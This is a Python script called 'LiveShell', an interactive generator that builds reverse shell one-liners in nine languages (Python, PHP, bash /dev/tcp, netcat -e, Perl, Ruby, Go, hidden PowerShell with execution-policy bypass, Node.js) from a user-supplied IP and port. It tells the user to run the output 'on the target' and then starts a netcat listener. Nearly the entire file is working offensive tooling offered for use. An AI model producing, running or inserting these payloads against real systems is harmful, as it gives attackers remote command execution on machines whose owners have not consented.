#!/usr/bin/env python3
import subprocess
from threading import Thread
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Banner with ASCII art
def banner():
    print(Fore.GREEN + r""+ Fore.RED + r"""
    ██╗     ██╗██╗   ██╗███████╗███████╗██╗  ██╗███████╗██╗     ██╗     
    ██║     ██║██║   ██║██╔════╝██╔════╝██║  ██║██╔════╝██║     ██║     
    ██║     ██║██║   ██║█████╗  ███████╗███████║█████╗  ██║     ██║     
    ██║     ██║╚██╗ ██╔╝██╔══╝  ╚════██║██╔══██║██╔══╝  ██║     ██║     
    ███████╗██║ ╚████╔╝ ███████╗███████║██║  ██║███████╗███████╗███████╗
    ╚══════╝╚═╝  ╚═══╝  ╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
    """ + Fore.CYAN + r"""
    Interactive Reverse Shell Generator
    """ + Style.RESET_ALL)

# Generate reverse shell code
def generate_reverse_shell(ip, port, language):
    if language == "python":
        return f"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'"""
    elif language == "php":
        return f"""php -r '$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");'"""
    elif language == "bash":
        return f"""bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'"""
    elif language == "nc":
        return f"""nc -e /bin/sh {ip} {port}"""
    elif language == "perl":
        return f"""perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'"""
    elif language == "ruby":
        return f"""ruby -rsocket -e 'exit if fork;c=TCPSocket.new("{ip}",{port});while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end'"""
    elif language == "go":
        return f"""echo 'package main;import"os/exec";import"net";func main(){{c,_:=net.Dial("tcp","{ip}:{port}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/shell.go && go run /tmp/shell.go"""
    elif language == "powershell":
        return f"""powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"""
    elif language == "javascript":
        return f"""require('child_process').exec('nc -e /bin/sh {ip} {port}')"""
    else:
        return "[-] Unsupported language."

# Start a listener
def start_listener(port):
    print(Fore.YELLOW + f"[*] Starting listener on port {port}..." + Style.RESET_ALL)
    try:
        subprocess.run(["nc", "-lvp", str(port)])
    except KeyboardInterrupt:
        print(Fore.RED + "\n[*] Listener stopped." + Style.RESET_ALL)

# Interactive menu
def interactive_menu():
    banner()
    print(Fore.CYAN + "[*] Welcome to LiveShell - Interactive Reverse Shell Generator!" + Style.RESET_ALL)
    print(Fore.CYAN + "[*] Please provide the following details:\n" + Style.RESET_ALL)

    # Get IP address
    ip = input(Fore.GREEN + "[+] Enter your IP address: " + Style.RESET_ALL).strip()
    while not ip:
        print(Fore.RED + "[-] IP address cannot be empty. Try again." + Style.RESET_ALL)
        ip = input(Fore.GREEN + "[+] Enter your IP address: " + Style.RESET_ALL).strip()

    # Get port
    port = input(Fore.GREEN + "[+] Enter the port to listen on (e.g., 4444): " + Style.RESET_ALL).strip()
    while not port.isdigit() or int(port) < 1 or int(port) > 65535:
        print(Fore.RED + "[-] Invalid port. Please enter a number between 1 and 65535." + Style.RESET_ALL)
        port = input(Fore.GREEN + "[+] Enter the port to listen on (e.g., 4444): " + Style.RESET_ALL).strip()
    port = int(port)

    # Get language
    print(Fore.CYAN + "\n[*] Available languages:" + Style.RESET_ALL)
    print(Fore.YELLOW + "1. Python")
    print("2. PHP")
    print("3. Bash")
    print("4. Netcat (nc)")
    print("5. Perl")
    print("6. Ruby")
    print("7. Go")
    print("8. PowerShell")
    print("9. JavaScript" + Style.RESET_ALL)
    language_choice = input(Fore.GREEN + "[+] Choose a language (1-9): " + Style.RESET_ALL).strip()
    while language_choice not in ["1", "2", "3", "4", "5", "6", "7", "8", "9"]:
        print(Fore.RED + "[-] Invalid choice. Please select a number between 1 and 9." + Style.RESET_ALL)
        language_choice = input(Fore.GREEN + "[+] Choose a language (1-9): " + Style.RESET_ALL).strip()

    languages = {
        "1": "python",
        "2": "php",
        "3": "bash",
        "4": "nc",
        "5": "perl",
        "6": "ruby",
        "7": "go",
        "8": "powershell",
        "9": "javascript"
    }
    language = languages[language_choice]

    # Generate reverse shell code
    reverse_shell = generate_reverse_shell(ip, port, language)
    print(Fore.CYAN + f"\n[+] Reverse shell code for {language}:\n" + Style.RESET_ALL)
    print(Fore.YELLOW + reverse_shell + Style.RESET_ALL)
    print(Fore.CYAN + "\n[*] Copy and execute the above code on the target." + Style.RESET_ALL)

    # Start listener in a separate thread
    listener_thread = Thread(target=start_listener, args=(port,))
    listener_thread.start()

    # Wait for the listener to finish
    listener_thread.join()

# Main function
def main():
    interactive_menu()

if __name__ == "__main__":
    main()
